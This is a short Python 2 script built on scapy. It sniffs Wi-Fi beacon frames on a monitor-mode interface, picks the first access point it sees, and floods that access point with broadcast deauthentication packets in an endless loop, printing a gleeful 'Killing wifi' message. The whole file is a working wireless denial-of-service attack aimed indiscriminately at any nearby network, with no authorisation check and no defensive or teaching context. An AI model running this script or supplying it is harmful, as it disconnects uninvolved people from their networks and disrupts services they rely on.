#!/usr/bin/env python2
import scapy.all

import os,sys,signal
import time
ips = []

import threading

def handler(p):
    if (p.haslayer(scapy.all.Dot11Beacon)):
        ssid = p[scapy.all.Dot11Elt].info
        bssid = p[scapy.all.Dot11].addr3

        if bssid not in ips:
            ips.append(bssid)
            
t = threading.Thread(target=scapy.all.sniff, kwargs={'iface':"wlo1mon",'prn': handler})
t.daemon = True
t.start()

def process():
    found = 0
    while True:
        if len(ips) > found:
            found = len(ips)
            time.sleep(1)

thread2 = threading.Thread(target=process)
thread2.daemon = True
thread2.start()

while len(ips) == 0:
    time.sleep(1)

print "Found " + str(len(ips)) + " networks."

# we have found at least one whoopie
WIFI = ips[0]
INTERFACE = "wlo1mon"


def send_deauth(mac, mon):
    # def makePacket(access_point,client="2c:0e:3d:0c:33:1a"):
    def makePacket(access_point,client="ff:ff:ff:ff:ff:ff"):
        return scapy.all.RadioTap()/scapy.all.Dot11(addr1=client, addr2=mac, addr3=mac)/scapy.all.Dot11Deauth()
    pkt = makePacket(access_point=mac)
    print "Killing wifi HEHEHEHHEHEHE"
    while True:
        scapy.all.sendp(pkt, iface=mon, count=1, inter=.2, verbose=0)

send_deauth(WIFI, INTERFACE)
